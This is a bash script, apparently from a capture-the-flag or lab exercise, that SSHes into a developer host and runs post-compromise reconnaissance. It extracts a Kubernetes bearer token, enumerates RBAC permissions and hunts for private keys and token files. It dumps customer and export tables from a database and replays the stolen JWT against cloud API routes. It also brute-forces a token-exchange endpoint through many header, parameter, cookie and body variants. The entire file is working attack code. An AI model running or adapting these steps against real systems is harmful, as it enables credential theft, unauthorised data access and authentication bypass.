set +e
ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=8 rowan-dev 'bash -s' <<'RSH'
set +e
JWT=$(kubectl config view --raw -o jsonpath='{.users[0].user.token}')
C=https://cloud-api.keplerops.test
echo "=== K8S NAMESPACES ==="
kubectl get ns 2>&1 | head -20
echo "=== CAN-I LIST ==="
kubectl auth can-i --list 2>&1 | head -30
echo "=== CLUSTERROLEBINDINGS ==="
kubectl get clusterrolebindings -o wide 2>&1 | head -30
echo "=== CLUSTERROLES ==="
kubectl get clusterroles 2>&1 | head -40
echo "=== SELF RULES per ns ==="
for ns in fieldlink default kube-system support identity data export workloads; do
 echo "-- $ns"; kubectl auth can-i --list -n $ns 2>&1 | head -8
done
echo "=== CONFIGMAPS default/kube-system ==="
kubectl get cm -n default 2>&1 | head -10
kubectl get cm -n kube-system 2>&1 | head -5
echo "=== CERT/KEY FILES on rowan ==="
find /home/rowan /etc/fieldkest* /opt -maxdepth 5 \( -name '*.crt' -o -name '*.key' -o -name '*.pem' -o -name '*.json' \) 2>/dev/null | grep -v -E 'chromium|\.kube/cache' | head -60
echo "=== GREP workload token strings in home ==="
grep -rIl -E 'workload_token|X-Workload|trust-record|trust_document' /home/rowan 2>/dev/null | head -20
echo "=== DB export.partition_bindings ==="
psql service=fieldlink -c 'select * from export.partition_bindings' 2>&1 | head -30
echo "=== DB table privs ==="
psql service=fieldlink -Atc "select table_schema||'.'||table_name||' '||string_agg(privilege_type,',') from information_schema.role_table_grants where grantee=current_user group by 1 order by 1" 2>&1 | head -40
echo "=== DB support tables ==="
psql service=fieldlink -c 'select * from support.customer_migration_history' 2>&1 | head -20
psql service=fieldlink -c 'select count(*) from support.customer_records' 2>&1 | head -5
echo "=== RLS ==="
psql service=fieldlink -Atc "select n.nspname||'.'||c.relname||' rls='||c.relrowsecurity||' forced='||c.relforcerowsecurity from pg_class c join pg_namespace n on n.oid=c.relnamespace where n.nspname in ('support','export','workspace','public')" 2>&1 | head -30
psql service=fieldlink -Atc "select schemaname||'.'||tablename||' pol='||policyname||' roles='||roles::text||' cmd='||cmd||' qual='||coalesce(qual,'') from pg_policies" 2>&1 | head -30
echo "=== CLOUD-API EXPORT ROUTES (JWT) ==="
for p in api/exports/EXP-2841 api/exports/EXP-2841/definition api/schedules/SCHED-2841 api/maintenance api/policies/default api/build-records/BLD-REL-742; do
 echo "-- $p"; curl -sSk -m 8 -w ' [%{http_code}]' -H "Authorization: Bearer $JWT" "$C/$p" | head -c 700; echo
done
echo "=== TOKEN EXCHANGE HEADER MATRIX (W2) ==="
W="FLAG{6bb66074f2325405}"
for h in "X-Workspace-Token" "X-Fieldkest-Workspace-Token" "Workspace-Token" "X-Workspace" "X-Token" "X-Auth-Token" "X-Fieldkest-Token" "X-Workspace-Id"; do
 for m in GET POST; do
  code=$(curl -sSk -m 6 -o /tmp/o -w '%{http_code}' -X $m -H "$h: $W" -H 'Content-Type: application/json' -d '{}' "$C/api/workspaces/current/token-exchange")
  echo "-- $m [$h] -> $code :: $(head -c 220 /tmp/o | tr '\n' ' ')"
 done
done
for q in workspace_token token; do
 code=$(curl -sSk -m 6 -o /tmp/o -w '%{http_code}' "$C/api/workspaces/current/token-exchange?$q=$W"); echo "-- GET ?$q -> $code :: $(head -c 200 /tmp/o|tr '\n' ' ')"
done
for a in "Workspace $W" "Bearer $W" "Token $W" "Workload $W"; do
 code=$(curl -sSk -m 6 -o /tmp/o -w '%{http_code}' -H "Authorization: $a" "$C/api/workspaces/current/token-exchange"); echo "-- GET auth[$a] -> $code :: $(head -c 200 /tmp/o|tr '\n' ' ')"
done
echo "=== TOKEN EXCHANGE BODY FIELDS ==="
for f in workspace_token token workspaceToken workspace_id workspace; do
 for m in POST PUT; do
  code=$(curl -sSk -m 6 -o /tmp/o -w '%{http_code}' -X $m -H 'Content-Type: application/json' -d "{\"$f\":\"$W\"}" "$C/api/workspaces/current/token-exchange"); echo "-- $m body $f -> $code :: $(head -c 200 /tmp/o|tr '\n' ' ')"
 done
done
echo "=== TOKEN EXCHANGE COOKIE/FORM ==="
code=$(curl -sSk -m 6 -o /tmp/o -w '%{http_code}' -H "Cookie: workspace_token=$W" "$C/api/workspaces/current/token-exchange"); echo "-- cookie -> $code :: $(head -c 200 /tmp/o|tr '\n' ' ')"
code=$(curl -sSk -m 6 -o /tmp/o -w '%{http_code}' -X POST -d "workspace_token=$W" "$C/api/workspaces/current/token-exchange"); echo "-- form -> $code :: $(head -c 200 /tmp/o|tr '\n' ' ')"
RSH
echo DONE_K14_R17
